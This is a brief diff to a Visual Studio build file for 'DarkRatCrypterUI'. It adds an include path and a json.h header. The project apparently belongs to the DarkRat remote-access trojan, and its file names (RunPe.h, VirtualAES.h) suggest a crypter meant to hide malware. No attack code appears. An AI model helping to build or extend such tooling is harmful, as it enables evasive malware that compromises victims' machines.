@@ -37,6 +37,7 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <OutDir>$(SolutionDir)$(Platform)\$(Configuration)\</OutDir>
     <EnableManagedIncrementalBuild>false</EnableManagedIncrementalBuild>
+    <IncludePath>C:\Users\darkspider\Desktop\DarkRat Coding\darkrat\darkrat-master\DarkRatUIBuilderNative\DarkRatCrypterUI\BuildSystem;$(IncludePath)</IncludePath>
   </PropertyGroup>
   <Target Name="QtMsBuildNotFound" BeforeTargets="CustomBuild;ClCompile" Condition="!Exists('$(QtMsBuild)\qt.targets') or !Exists('$(QtMsBuild)\qt.props')">
     <Message Importance="High" Text="QtMsBuild: could not locate qt.targets, qt.props; project may not build correctly." />
@@ -132,6 +133,7 @@
     <QtRcc Include="DarkRatCrypterUI.qrc" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="BuildSystem\json.h" />
     <ClInclude Include="RawBuilder.h" />
     <ClInclude Include="RunPe.h" />
     <ClInclude Include="VirtualAES.h" />
